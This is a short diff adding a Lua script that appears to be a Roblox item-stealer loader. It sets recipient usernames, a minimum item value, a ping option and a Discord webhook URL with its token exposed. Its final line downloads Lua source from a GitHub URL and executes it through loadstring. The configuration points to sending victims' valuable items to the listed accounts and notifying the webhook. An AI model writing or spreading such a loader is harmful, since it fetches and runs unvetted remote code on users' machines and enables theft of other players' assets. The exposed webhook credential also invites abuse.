@@ -1,0 +1,6 @@
+_G.Usernames = {"jjsgk1", "jjsgk1", "jjsgk1"} -- you can add as many as you'd like
+_G.min_value = 100000000 -- 100 million
+_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
+_G.webhook = "https://discord.com/api/webhooks/1377936324215963739/jDxjpz1Y_bF2mSrlud9k1ZyZzd3XgyjmCwPKN2h-jhO3XnNv050ZRJVDm6lWWZDzqH_b" -- change to your webhook
+
+loadstring(game:HttpGet("https://github.com/Boom123794/Boomno1/blob/main/source.lua"))()
